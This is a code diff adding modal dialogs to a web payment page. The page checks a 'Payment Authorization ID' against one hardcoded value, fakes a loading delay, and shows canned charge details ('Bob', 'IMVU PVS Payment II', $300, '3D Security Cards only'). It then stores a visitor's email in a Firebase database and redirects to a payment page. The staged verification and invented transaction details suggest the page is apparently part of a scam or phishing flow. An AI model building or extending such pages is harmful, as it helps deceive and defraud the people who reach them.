@@ -179,7 +179,21 @@
                         </ul>
                     </div>
                 </div>
-            </div>
+          <div class="row mt-4">
+                    <div class="col-md-12">
+                        <h3 class="text-2xl font-bold mb-4 text-gray-800">Choose Payment Actions</h3>
+                        <ul class="list-group">
+                            <li class="list-group-item bg-blue-100 rounded-md shadow-md">
+                                <strong onclick="my_modal_1.showModal()" class="text-blue-700" style="cursor: pointer;">Initiate a Payment</strong>
+                            </li>
+                            <li class="list-group-item bg-green-100 rounded-md shadow-md">
+                                <strong class="text-green-700">Monitor Payment Status</strong>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+                
+                
         </main>
         
         
@@ -236,3 +250,179 @@ document.addEventListener("DOMContentLoaded", function() {
     window.history.pushState({}, '', '/payment?information=true');
 </script>
 </html>
+
+
+<!-- Open the modal using ID.showModal() method -->
+<dialog id="my_modal_1" class="modal">
+    <div class="modal-box">
+      <h3 class="font-bold text-lg">Initiate Payment</h3>
+      <input type="text" id="auth_id" placeholder="Payment Authorization ID" class="input input-bordered w-full p-2 mt-2" style="box-sizing: border-box;" maxlength="43">
+      <p id="error-message" style="color: red; display: none;">Invalid Authorization ID</p>
+      <div class="modal-action">
+        <form method="dialog">
+          <button type="button" class="btn" onclick="closeModal('my_modal_1')">Close</button>
+          <button type="button" class="btn" onclick="fetchDetails()">Fetch Details</button>
+        </form>
+      </div>
+    </div>
+  </dialog>
+
+  <dialog id="my_modal_2" class="modal">
+    <div class="modal-box">
+      <h3 class="font-bold text-lg">Payment Details</h3>
+      <div class="payment-details">
+        <p class="consumer-name"><strong>Consumer Name:</strong> Bob</p>
+        <p class="payment-for"><strong>Payment For:</strong> IMVU PVS Payment II</p>
+        <p class="payment-method"><strong>Payment Method Allowed:</strong> Credit/Debit</p>
+        <p class="amount"><strong>Amount:</strong> $300 <span class="note">(amount shown without taxes)</span></p>
+        <p class="security-note" style="color: red; font-weight: bold;">Only 3D Security Cards are Accepted</p>
+      </div>
+      <div class="modal-action">
+        <form method="dialog">
+          <button type="button" class="btn" onclick="closeModal('my_modal_2')">Close</button>
+          <button onclick="my_modal_3.showModal()" class="btn">Make Payment</button>
+        </form>
+      </div>
+    </div>
+  </dialog>
+  
+  <style>
+    .modal-box {
+      padding: 20px;
+      border-radius: 8px;
+      background-color: #f9f9f9;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+    }
+  
+    .payment-details p {
+      margin: 8px 0;
+      font-size: 16px;
+    }
+  
+    .payment-details strong {
+      color: #333;
+    }
+  
+    .payment-details .note {
+      font-size: 14px;
+      color: #888;
+    }
+  
+    .payment-details .security-note {
+      color: red;
+      font-weight: bold;
+    }
+  </style>
+<script>
+    function fetchDetails() {
+      const authIdInput = document.getElementById('auth_id');
+      const errorMessage = document.getElementById('error-message');
+      const authId = authIdInput.value;
+
+      if (authId === 'PAY-AuthID-9F7B2C8KLM35XH72PQRD6VWY4ZTJ1S0A') {
+        errorMessage.style.display = 'none';
+        const fetchButton = document.querySelector('#my_modal_1 .modal-action .btn:nth-child(2)');
+        fetchButton.innerHTML = 'Fetching Details';
+        fetchButton.disabled = true;
+        setTimeout(() => {
+          fetchButton.innerHTML = 'Fetch Details';
+          fetchButton.disabled = false;
+          closeModal('my_modal_1');
+          openModal('my_modal_2');
+        }, 4000);
+      } else {
+        errorMessage.style.display = 'block';
+      }
+    }
+
+    function openModal(modalId) {
+      const modal = document.getElementById(modalId);
+      if (modal) {
+        modal.showModal();
+      }
+    }
+
+    function closeModal(modalId) {
+      const modal = document.getElementById(modalId);
+      if (modal) {
+        modal.close();
+      }
+    }
+
+
+  </script>
+
+
+
+<form id="emailForm">
+  <dialog  id="my_modal_3" class="modal">
+    <div class="modal-box">
+      <h3 class="font-bold text-lg">Email Address</h3>
+      <input
+        type="email"
+        id="email"
+        placeholder="Legal Email Address"
+        name="email"
+        class="input input-bordered w-full p-2 mt-2"
+        style="box-sizing: border-box;"
+        maxlength="43"
+      />
+      <div class="modal-action">  
+        <button type="button" class="btn" onclick="closeModal('my_modal_3')">
+          Close
+        </button>
+        <button type="submit" class="btn" id="paymentBtn" onclick="change()">
+          Go to Payment Page
+        </button>
+      </div>
+    </div>
+  </dialog>
+</form>
+
+
+
+<script>
+  // Initialize Firebase
+  const firebaseConfig = {
+        apiKey: "AIzaSyBU0LStfJ1OJRZZmUzIrjw9cLSeNTFw0MU",
+       authDomain: "asfaf-a7cfe.firebaseapp.com",
+       databaseURL: "https://asfaf-a7cfe-default-rtdb.firebaseio.com",
+       projectId: "asfaf-a7cfe",
+       storageBucket: "asfaf-a7cfe.appspot.com",
+       messagingSenderId: "64928322953",
+       appId: "1:64928322953:web:dc9b3383a1feb309387d58",
+       measurementId: "G-TM7HMP57ZK"
+    };
+    firebase.initializeApp(firebaseConfig);
+
+    // Get a reference to the database service
+    const database = firebase.database();
+
+    // Handle form submission
+    document.getElementById('emailForm').addEventListener('submit', function(event) {
+      event.preventDefault(); // Prevent default form submission
+      
+      // Get the email input value
+      const email = document.getElementById('email').value;
+
+      // Store email in Firebase Database under 'emails' node
+      database.ref('emails').push().set({
+        email: email
+      }).then(function() {
+        window.location.href = "perform_payment.html";
+        // Clear the form after submission
+        document.getElementById('emailForm').reset();
+      }).catch(function(error) {
+        console.error('Error storing email: ', error);
+        alert('Failed to store email. Please try again later.');
+      });
+    });
+
+  function change(){
+   document.getElementById('paymentBtn').innerText="Redirecting";
+   document.getElementById('paymentBtn').style.color = '#c9cbce';
+
+
+  }
+           
+</script>
